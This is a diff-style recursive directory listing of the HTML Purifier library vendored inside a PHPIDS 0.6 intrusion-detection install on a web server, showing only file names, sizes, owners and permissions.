+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/AttrDef/CSS:
+total 84K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  570 Nov  9 03:25 AlphaValue.php
+-rw-rw-r-- 1 www-data www-data 2.9K Nov  9 03:25 Background.php
+-rw-rw-r-- 1 www-data www-data 3.7K Nov  9 03:25 BackgroundPosition.php
+-rw-rw-r-- 1 www-data www-data 1.3K Nov  9 03:25 Border.php
+-rw-rw-r-- 1 www-data www-data 2.7K Nov  9 03:25 Color.php
+-rw-rw-r-- 1 www-data www-data 1.2K Nov  9 03:25 Composite.php
+-rw-rw-r-- 1 www-data www-data  785 Nov  9 03:25 DenyElementDecorator.php
+-rw-rw-r-- 1 www-data www-data 2.0K Nov  9 03:25 Filter.php
+-rw-rw-r-- 1 www-data www-data 3.3K Nov  9 03:25 FontFamily.php
+-rw-rw-r-- 1 www-data www-data 6.1K Nov  9 03:25 Font.php
+-rw-rw-r-- 1 www-data www-data 1.3K Nov  9 03:25 ImportantDecorator.php
+-rw-rw-r-- 1 www-data www-data 1.5K Nov  9 03:25 Length.php
+-rw-rw-r-- 1 www-data www-data 2.4K Nov  9 03:25 ListStyle.php
+-rw-rw-r-- 1 www-data www-data 1.8K Nov  9 03:25 Multiple.php
+-rw-rw-r-- 1 www-data www-data 2.0K Nov  9 03:25 Number.php
+-rw-rw-r-- 1 www-data www-data 1.1K Nov  9 03:25 Percentage.php
+-rw-rw-r-- 1 www-data www-data 1012 Nov  9 03:25 TextDecoration.php
+-rw-rw-r-- 1 www-data www-data 2.1K Nov  9 03:25 URI.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/AttrDef/HTML:
+total 44K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  585 Nov  9 03:25 Bool.php
+-rw-rw-r-- 1 www-data www-data  875 Nov  9 03:25 Color.php
+-rw-rw-r-- 1 www-data www-data  587 Nov  9 03:25 FrameTarget.php
+-rw-rw-r-- 1 www-data www-data 2.4K Nov  9 03:25 ID.php
+-rw-rw-r-- 1 www-data www-data 1.1K Nov  9 03:25 Length.php
+-rw-rw-r-- 1 www-data www-data 1.5K Nov  9 03:25 LinkTypes.php
+-rw-rw-r-- 1 www-data www-data 1.1K Nov  9 03:25 MultiLength.php
+-rw-rw-r-- 1 www-data www-data 1.7K Nov  9 03:25 Nmtokens.php
+-rw-rw-r-- 1 www-data www-data 1.4K Nov  9 03:25 Pixels.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/AttrDef/URI:
+total 28K
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 Email
+-rw-rw-r-- 1 www-data www-data  282 Nov  9 03:25 Email.php
+-rw-rw-r-- 1 www-data www-data 2.1K Nov  9 03:25 Host.php
+-rw-rw-r-- 1 www-data www-data  870 Nov  9 03:25 IPv4.php
+-rw-rw-r-- 1 www-data www-data 2.8K Nov  9 03:25 IPv6.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/AttrDef/URI/Email:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  646 Nov  9 03:25 SimpleCheck.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/AttrTransform:
+total 76K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r--  1 www-data www-data  568 Nov  9 03:25 Background.php
+-rw-rw-r--  1 www-data www-data  470 Nov  9 03:25 BdoDir.php
+-rw-rw-r--  1 www-data www-data  544 Nov  9 03:25 BgColor.php
+-rw-rw-r--  1 www-data www-data  900 Nov  9 03:25 BoolToCSS.php
+-rw-rw-r--  1 www-data www-data  500 Nov  9 03:25 Border.php
+-rw-rw-r--  1 www-data www-data 1.6K Nov  9 03:25 EnumToCSS.php
+-rw-rw-r--  1 www-data www-data 1.2K Nov  9 03:25 ImgRequired.php
+-rw-rw-r--  1 www-data www-data 1.2K Nov  9 03:25 ImgSpace.php
+-rw-rw-r--  1 www-data www-data 1.3K Nov  9 03:25 Input.php
+-rw-rw-r--  1 www-data www-data  756 Nov  9 03:25 Lang.php
+-rw-rw-r--  1 www-data www-data  726 Nov  9 03:25 Length.php
+-rw-rw-r--  1 www-data www-data  459 Nov  9 03:25 Name.php
+-rw-rw-r--  1 www-data www-data  372 Nov  9 03:25 SafeEmbed.php
+-rw-rw-r--  1 www-data www-data  380 Nov  9 03:25 SafeObject.php
+-rw-rw-r--  1 www-data www-data 1.6K Nov  9 03:25 SafeParam.php
+-rw-rw-r--  1 www-data www-data  354 Nov  9 03:25 ScriptRequired.php
+-rw-rw-r--  1 www-data www-data  399 Nov  9 03:25 Textarea.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/ChildDef:
+total 40K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r--  1 www-data www-data 1.6K Nov  9 03:25 Chameleon.php
+-rw-rw-r--  1 www-data www-data 2.9K Nov  9 03:25 Custom.php
+-rw-rw-r--  1 www-data www-data  620 Nov  9 03:25 Empty.php
+-rw-rw-r--  1 www-data www-data  830 Nov  9 03:25 Optional.php
+-rw-rw-r--  1 www-data www-data 3.8K Nov  9 03:25 Required.php
+-rw-rw-r--  1 www-data www-data 3.3K Nov  9 03:25 StrictBlockquote.php
+-rw-rw-r--  1 www-data www-data 5.7K Nov  9 03:25 Table.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/ConfigDef:
+total 20K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r--  1 www-data www-data  475 Nov  9 03:25 DirectiveAlias.php
+-rw-rw-r--  1 www-data www-data 1.5K Nov  9 03:25 Directive.php
+-rw-rw-r--  1 www-data www-data  179 Nov  9 03:25 Namespace.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/ConfigSchema:
+total 60K
+drwxrwxr-x  5 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 Builder
+-rw-rw-r--  1 www-data www-data  152 Nov  9 03:25 Exception.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 Interchange
+-rw-rw-r--  1 www-data www-data 6.2K Nov  9 03:25 InterchangeBuilder.php
+-rw-rw-r--  1 www-data www-data 1.6K Nov  9 03:25 Interchange.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 schema
+-rw-rw-r--  1 www-data www-data 7.4K Nov  9 03:25 schema.ser
+-rw-rw-r--  1 www-data www-data 2.0K Nov  9 03:25 ValidatorAtom.php
+-rw-rw-r--  1 www-data www-data 8.5K Nov  9 03:25 Validator.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/ConfigSchema/Builder:
+total 16K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 1.5K Nov  9 03:25 ConfigSchema.php
+-rw-rw-r-- 1 www-data www-data 4.0K Nov  9 03:25 Xml.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/ConfigSchema/Interchange:
+total 20K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 1.9K Nov  9 03:25 Directive.php
+-rw-rw-r-- 1 www-data www-data  783 Nov  9 03:25 Id.php
+-rw-rw-r-- 1 www-data www-data  300 Nov  9 03:25 Namespace.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/ConfigSchema/schema:
+total 428K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  566 Nov  9 03:25 Attr.AllowedFrameTargets.txt
+-rw-rw-r-- 1 www-data www-data  274 Nov  9 03:25 Attr.AllowedRel.txt
+-rw-rw-r-- 1 www-data www-data  241 Nov  9 03:25 Attr.AllowedRev.txt
+-rw-rw-r-- 1 www-data www-data  450 Nov  9 03:25 Attr.DefaultImageAlt.txt
+-rw-rw-r-- 1 www-data www-data  285 Nov  9 03:25 Attr.DefaultInvalidImageAlt.txt
+-rw-rw-r-- 1 www-data www-data  305 Nov  9 03:25 Attr.DefaultInvalidImage.txt
+-rw-rw-r-- 1 www-data www-data  280 Nov  9 03:25 Attr.DefaultTextDir.txt
+-rw-rw-r-- 1 www-data www-data  637 Nov  9 03:25 Attr.EnableID.txt
+-rw-rw-r-- 1 www-data www-data  303 Nov  9 03:25 Attr.IDBlacklistRegexp.txt
+-rw-rw-r-- 1 www-data www-data  104 Nov  9 03:25 Attr.IDBlacklist.txt
+-rw-rw-r-- 1 www-data www-data  651 Nov  9 03:25 Attr.IDPrefixLocal.txt
+-rw-rw-r-- 1 www-data www-data  465 Nov  9 03:25 Attr.IDPrefix.txt
+-rw-rw-r-- 1 www-data www-data   61 Nov  9 03:25 Attr.txt
+-rw-rw-r-- 1 www-data www-data 1.2K Nov  9 03:25 AutoFormat.AutoParagraph.txt
+-rw-rw-r-- 1 www-data www-data  292 Nov  9 03:25 AutoFormat.Custom.txt
+-rw-rw-r-- 1 www-data www-data  304 Nov  9 03:25 AutoFormat.DisplayLinkURI.txt
+-rw-rw-r-- 1 www-data www-data  258 Nov  9 03:25 AutoFormat.Linkify.txt
+-rw-rw-r-- 1 www-data www-data  275 Nov  9 03:25 AutoFormatParam.PurifierLinkifyDocURL.txt
+-rw-rw-r-- 1 www-data www-data   91 Nov  9 03:25 AutoFormatParam.txt
+-rw-rw-r-- 1 www-data www-data  298 Nov  9 03:25 AutoFormat.PurifierLinkify.txt
+-rw-rw-r-- 1 www-data www-data 1.7K Nov  9 03:25 AutoFormat.RemoveEmpty.txt
+-rw-rw-r-- 1 www-data www-data  124 Nov  9 03:25 AutoFormat.txt
+-rw-rw-r-- 1 www-data www-data  365 Nov  9 03:25 Cache.DefinitionImpl.txt
+-rw-rw-r-- 1 www-data www-data  322 Nov  9 03:25 Cache.SerializerPath.txt
+-rw-rw-r-- 1 www-data www-data   79 Nov  9 03:25 Cache.txt
+-rw-rw-r-- 1 www-data www-data  654 Nov  9 03:25 Core.AggressivelyFixLt.txt
+-rw-rw-r-- 1 www-data www-data  422 Nov  9 03:25 Core.CollectErrors.txt
+-rw-rw-r-- 1 www-data www-data  658 Nov  9 03:25 Core.ColorKeywords.txt
+-rw-rw-r-- 1 www-data www-data  423 Nov  9 03:25 Core.ConvertDocumentToFragment.txt
+-rw-rw-r-- 1 www-data www-data  628 Nov  9 03:25 Core.DirectLexLineNumberSyncInterval.txt
+-rw-rw-r-- 1 www-data www-data  758 Nov  9 03:25 Core.Encoding.txt
+-rw-rw-r-- 1 www-data www-data  382 Nov  9 03:25 Core.EscapeInvalidChildren.txt
+-rw-rw-r-- 1 www-data www-data  185 Nov  9 03:25 Core.EscapeInvalidTags.txt
+-rw-rw-r-- 1 www-data www-data  557 Nov  9 03:25 Core.EscapeNonASCIICharacters.txt
+-rw-rw-r-- 1 www-data www-data  573 Nov  9 03:25 Core.HiddenElements.txt
+-rw-rw-r-- 1 www-data www-data  282 Nov  9 03:25 Core.Language.txt
+-rw-rw-r-- 1 www-data www-data 1.1K Nov  9 03:25 Core.LexerImpl.txt
+-rw-rw-r-- 1 www-data www-data  552 Nov  9 03:25 Core.MaintainLineNumbers.txt
+-rw-rw-r-- 1 www-data www-data  326 Nov  9 03:25 Core.RemoveInvalidImg.txt
+-rw-rw-r-- 1 www-data www-data  268 Nov  9 03:25 Core.RemoveScriptContents.txt
+-rw-rw-r-- 1 www-data www-data   61 Nov  9 03:25 Core.txt
+-rw-rw-r-- 1 www-data www-data  608 Nov  9 03:25 CSS.AllowedProperties.txt
+-rw-rw-r-- 1 www-data www-data  220 Nov  9 03:25 CSS.AllowImportant.txt
+-rw-rw-r-- 1 www-data www-data  448 Nov  9 03:25 CSS.AllowTricky.txt
+-rw-rw-r-- 1 www-data www-data  186 Nov  9 03:25 CSS.DefinitionRev.txt
+-rw-rw-r-- 1 www-data www-data  615 Nov  9 03:25 CSS.MaxImgLength.txt
+-rw-rw-r-- 1 www-data www-data  153 Nov  9 03:25 CSS.Proprietary.txt
+-rw-rw-r-- 1 www-data www-data   56 Nov  9 03:25 CSS.txt
+-rw-rw-r-- 1 www-data www-data  294 Nov  9 03:25 Filter.Custom.txt
+-rw-rw-r-- 1 www-data www-data 2.8K Nov  9 03:25 Filter.ExtractStyleBlocks.txt
+-rw-rw-r-- 1 www-data www-data  442 Nov  9 03:25 FilterParam.ExtractStyleBlocksEscaping.txt
+-rw-rw-r-- 1 www-data www-data 1.2K Nov  9 03:25 FilterParam.ExtractStyleBlocksScope.txt
+-rw-rw-r-- 1 www-data www-data  523 Nov  9 03:25 FilterParam.ExtractStyleBlocksTidyImpl.txt
+-rw-rw-r-- 1 www-data www-data   54 Nov  9 03:25 FilterParam.txt
+-rw-rw-r-- 1 www-data www-data   95 Nov  9 03:25 Filter.txt
+-rw-rw-r-- 1 www-data www-data  313 Nov  9 03:25 Filter.YouTube.txt
+-rw-rw-r-- 1 www-data www-data  611 Nov  9 03:25 HTML.AllowedAttributes.txt
+-rw-rw-r-- 1 www-data www-data  699 Nov  9 03:25 HTML.AllowedElements.txt
+-rw-rw-r-- 1 www-data www-data  725 Nov  9 03:25 HTML.AllowedModules.txt
+-rw-rw-r-- 1 www-data www-data  810 Nov  9 03:25 HTML.Allowed.txt
+-rw-rw-r-- 1 www-data www-data  568 Nov  9 03:25 HTML.BlockWrapper.txt
+-rw-rw-r-- 1 www-data www-data  624 Nov  9 03:25 HTML.CoreModules.txt
+-rw-rw-r-- 1 www-data www-data  222 Nov  9 03:25 HTML.CustomDoctype.txt
+-rw-rw-r-- 1 www-data www-data 1.2K Nov  9 03:25 HTML.DefinitionID.txt
+-rw-rw-r-- 1 www-data www-data  529 Nov  9 03:25 HTML.DefinitionRev.txt
+-rw-rw-r-- 1 www-data www-data  460 Nov  9 03:25 HTML.Doctype.txt
+-rw-rw-r-- 1 www-data www-data  849 Nov  9 03:25 HTML.ForbiddenAttributes.txt
+-rw-rw-r-- 1 www-data www-data  750 Nov  9 03:25 HTML.ForbiddenElements.txt
+-rw-rw-r-- 1 www-data www-data  478 Nov  9 03:25 HTML.MaxImgLength.txt
+-rw-rw-r-- 1 www-data www-data  307 Nov  9 03:25 HTML.Parent.txt
+-rw-rw-r-- 1 www-data www-data  322 Nov  9 03:25 HTML.Proprietary.txt
+-rw-rw-r-- 1 www-data www-data  479 Nov  9 03:25 HTML.SafeEmbed.txt
+-rw-rw-r-- 1 www-data www-data  511 Nov  9 03:25 HTML.SafeObject.txt
+-rw-rw-r-- 1 www-data www-data  206 Nov  9 03:25 HTML.Strict.txt
+-rw-rw-r-- 1 www-data www-data  150 Nov  9 03:25 HTML.TidyAdd.txt
+-rw-rw-r-- 1 www-data www-data  620 Nov  9 03:25 HTML.TidyLevel.txt
+-rw-rw-r-- 1 www-data www-data  158 Nov  9 03:25 HTML.TidyRemove.txt
+-rw-rw-r-- 1 www-data www-data  228 Nov  9 03:25 HTML.Trusted.txt
+-rw-rw-r-- 1 www-data www-data   58 Nov  9 03:25 HTML.txt
+-rw-rw-r-- 1 www-data www-data  222 Nov  9 03:25 HTML.XHTML.txt
+-rw-rw-r-- 1 www-data www-data   24 Nov  9 03:25 info.ini
+-rw-rw-r-- 1 www-data www-data  262 Nov  9 03:25 Output.CommentScriptContents.txt
+-rw-rw-r-- 1 www-data www-data  350 Nov  9 03:25 Output.Newline.txt
+-rw-rw-r-- 1 www-data www-data  499 Nov  9 03:25 Output.SortAttr.txt
+-rw-rw-r-- 1 www-data www-data  829 Nov  9 03:25 Output.TidyFormat.txt
+-rw-rw-r-- 1 www-data www-data   75 Nov  9 03:25 Output.txt
+-rw-rw-r-- 1 www-data www-data  180 Nov  9 03:25 Test.ForceNoIconv.txt
+-rw-rw-r-- 1 www-data www-data   72 Nov  9 03:25 Test.txt
+-rw-rw-r-- 1 www-data www-data  339 Nov  9 03:25 URI.AllowedSchemes.txt
+-rw-rw-r-- 1 www-data www-data  651 Nov  9 03:25 URI.Base.txt
+-rw-rw-r-- 1 www-data www-data  234 Nov  9 03:25 URI.DefaultScheme.txt
+-rw-rw-r-- 1 www-data www-data  231 Nov  9 03:25 URI.DefinitionID.txt
+-rw-rw-r-- 1 www-data www-data  186 Nov  9 03:25 URI.DefinitionRev.txt
+-rw-rw-r-- 1 www-data www-data  539 Nov  9 03:25 URI.DisableExternalResources.txt
+-rw-rw-r-- 1 www-data www-data  431 Nov  9 03:25 URI.DisableExternal.txt
+-rw-rw-r-- 1 www-data www-data  282 Nov  9 03:25 URI.DisableResources.txt
+-rw-rw-r-- 1 www-data www-data  264 Nov  9 03:25 URI.Disable.txt
+-rw-rw-r-- 1 www-data www-data  296 Nov  9 03:25 URI.HostBlacklist.txt
+-rw-rw-r-- 1 www-data www-data  822 Nov  9 03:25 URI.Host.txt
+-rw-rw-r-- 1 www-data www-data  379 Nov  9 03:25 URI.MakeAbsolute.txt
+-rw-rw-r-- 1 www-data www-data  604 Nov  9 03:25 URI.MungeResources.txt
+-rw-rw-r-- 1 www-data www-data  976 Nov  9 03:25 URI.MungeSecretKey.txt
+-rw-rw-r-- 1 www-data www-data 2.8K Nov  9 03:25 URI.Munge.txt
+-rw-rw-r-- 1 www-data www-data  311 Nov  9 03:25 URI.OverrideAllowedSchemes.txt
+-rw-rw-r-- 1 www-data www-data   68 Nov  9 03:25 URI.txt
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/DefinitionCache:
+total 32K
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 Decorator
+-rw-rw-r--  1 www-data www-data 1.5K Nov  9 03:25 Decorator.php
+-rw-rw-r--  1 www-data www-data  698 Nov  9 03:25 Null.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 Serializer
+-rw-rw-r--  1 www-data www-data 6.1K Nov  9 03:25 Serializer.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/DefinitionCache/Decorator:
+total 20K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 1.1K Nov  9 03:25 Cleanup.php
+-rw-rw-r-- 1 www-data www-data 1.4K Nov  9 03:25 Memory.php
+-rw-rw-r-- 1 www-data www-data 1011 Nov  9 03:25 Template.php.in
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/DefinitionCache/Serializer:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data   73 Nov  9 03:25 README
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/EntityLookup:
+total 16K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r--  1 www-data www-data 5.1K Nov  9 03:25 entities.ser
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Filter:
+total 20K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r--  1 www-data www-data 5.2K Nov  9 03:25 ExtractStyleBlocks.php
+-rw-rw-r--  1 www-data www-data 1.2K Nov  9 03:25 YouTube.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/HTMLModule:
+total 116K
+drwxrwxr-x  3 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r--  1 www-data www-data  901 Nov  9 03:25 Bdo.php
+-rw-rw-r--  1 www-data www-data  608 Nov  9 03:25 CommonAttributes.php
+-rw-rw-r--  1 www-data www-data 1.2K Nov  9 03:25 Edit.php
+-rw-rw-r--  1 www-data www-data 4.8K Nov  9 03:25 Forms.php
+-rw-rw-r--  1 www-data www-data  851 Nov  9 03:25 Hypertext.php
+-rw-rw-r--  1 www-data www-data 1.3K Nov  9 03:25 Image.php
+-rw-rw-r--  1 www-data www-data 5.0K Nov  9 03:25 Legacy.php
+-rw-rw-r--  1 www-data www-data 1.3K Nov  9 03:25 List.php
+-rw-rw-r--  1 www-data www-data  408 Nov  9 03:25 Name.php
+-rw-rw-r--  1 www-data www-data  278 Nov  9 03:25 NonXMLCommonAttributes.php
+-rw-rw-r--  1 www-data www-data 1.4K Nov  9 03:25 Object.php
+-rw-rw-r--  1 www-data www-data 1.2K Nov  9 03:25 Presentation.php
+-rw-rw-r--  1 www-data www-data  887 Nov  9 03:25 Proprietary.php
+-rw-rw-r--  1 www-data www-data  939 Nov  9 03:25 Ruby.php
+-rw-rw-r--  1 www-data www-data  948 Nov  9 03:25 SafeEmbed.php
+-rw-rw-r--  1 www-data www-data 1.6K Nov  9 03:25 SafeObject.php
+-rw-rw-r--  1 www-data www-data 2.2K Nov  9 03:25 Scripting.php
+-rw-rw-r--  1 www-data www-data  661 Nov  9 03:25 StyleAttribute.php
+-rw-rw-r--  1 www-data www-data 2.2K Nov  9 03:25 Tables.php
+-rw-rw-r--  1 www-data www-data  515 Nov  9 03:25 Target.php
+-rw-rw-r--  1 www-data www-data 3.1K Nov  9 03:25 Text.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 Tidy
+-rw-rw-r--  1 www-data www-data 7.2K Nov  9 03:25 Tidy.php
+-rw-rw-r--  1 www-data www-data  276 Nov  9 03:25 XMLCommonAttributes.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/HTMLModule/Tidy:
+total 36K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  671 Nov  9 03:25 Name.php
+-rw-rw-r-- 1 www-data www-data  835 Nov  9 03:25 Proprietary.php
+-rw-rw-r-- 1 www-data www-data  620 Nov  9 03:25 Strict.php
+-rw-rw-r-- 1 www-data www-data  195 Nov  9 03:25 Transitional.php
+-rw-rw-r-- 1 www-data www-data 7.0K Nov  9 03:25 XHTMLAndHTML4.php
+-rw-rw-r-- 1 www-data www-data  333 Nov  9 03:25 XHTML.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Injector:
+total 44K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r--  1 www-data www-data  14K Nov  9 03:25 AutoParagraph.php
+-rw-rw-r--  1 www-data www-data  697 Nov  9 03:25 DisplayLinkURI.php
+-rw-rw-r--  1 www-data www-data 1.5K Nov  9 03:25 Linkify.php
+-rw-rw-r--  1 www-data www-data 1.5K Nov  9 03:25 PurifierLinkify.php
+-rw-rw-r--  1 www-data www-data 1.6K Nov  9 03:25 RemoveEmpty.php
+-rw-rw-r--  1 www-data www-data 3.2K Nov  9 03:25 SafeObject.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Language:
+total 16K
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 classes
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 messages
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Language/classes:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  141 Nov  9 03:25 en-x-test.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Language/messages:
+total 20K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 3.8K Nov  9 03:25 en.php
+-rw-rw-r-- 1 www-data www-data  218 Nov  9 03:25 en-x-testmini.php
+-rw-rw-r-- 1 www-data www-data  159 Nov  9 03:25 en-x-test.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Lexer:
+total 216K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r--  1 www-data www-data  21K Nov  9 03:25 DirectLex.php
+-rw-rw-r--  1 www-data www-data 8.5K Nov  9 03:25 DOMLex.php
+-rw-rw-r--  1 www-data www-data 3.6K Nov  9 03:25 PEARSax3.php
+-rw-rw-r--  1 www-data www-data 165K Nov  9 03:25 PH5P.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Printer:
+total 48K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r--  1 www-data www-data  283 Nov  9 03:25 ConfigForm.css
+-rw-rw-r--  1 www-data www-data  120 Nov  9 03:25 ConfigForm.js
+-rw-rw-r--  1 www-data www-data  14K Nov  9 03:25 ConfigForm.php
+-rw-rw-r--  1 www-data www-data 1.2K Nov  9 03:25 CSSDefinition.php
+-rw-rw-r--  1 www-data www-data  11K Nov  9 03:25 HTMLDefinition.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Strategy:
+total 64K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r--  1 www-data www-data  569 Nov  9 03:25 Composite.php
+-rw-rw-r--  1 www-data www-data  519 Nov  9 03:25 Core.php
+-rw-rw-r--  1 www-data www-data  14K Nov  9 03:25 FixNesting.php
+-rw-rw-r--  1 www-data www-data  18K Nov  9 03:25 MakeWellFormed.php
+-rw-rw-r--  1 www-data www-data 7.8K Nov  9 03:25 RemoveForeignElements.php
+-rw-rw-r--  1 www-data www-data 1.2K Nov  9 03:25 ValidateAttributes.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/TagTransform:
+total 16K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r--  1 www-data www-data 2.8K Nov  9 03:25 Font.php
+-rw-rw-r--  1 www-data www-data  980 Nov  9 03:25 Simple.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Token:
+total 32K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r--  1 www-data www-data  474 Nov  9 03:25 Comment.php
+-rw-rw-r--  1 www-data www-data  126 Nov  9 03:25 Empty.php
+-rw-rw-r--  1 www-data www-data  435 Nov  9 03:25 End.php
+-rw-rw-r--  1 www-data www-data  126 Nov  9 03:25 Start.php
+-rw-rw-r--  1 www-data www-data 1.7K Nov  9 03:25 Tag.php
+-rw-rw-r--  1 www-data www-data 1.1K Nov  9 03:25 Text.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/URIFilter:
+total 32K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r--  1 www-data www-data  820 Nov  9 03:25 DisableExternal.php
+-rw-rw-r--  1 www-data www-data  350 Nov  9 03:25 DisableExternalResources.php
